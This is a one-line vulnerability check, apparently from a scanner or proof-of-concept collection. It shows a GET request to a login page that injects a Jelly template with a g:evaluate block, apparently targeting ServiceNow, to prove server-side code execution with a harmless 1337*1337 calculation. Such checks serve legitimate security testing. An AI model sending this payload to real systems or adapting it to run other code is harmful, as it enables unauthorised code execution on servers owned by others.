# Vulnerable: ITS-1092
GET /login.do?jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style>
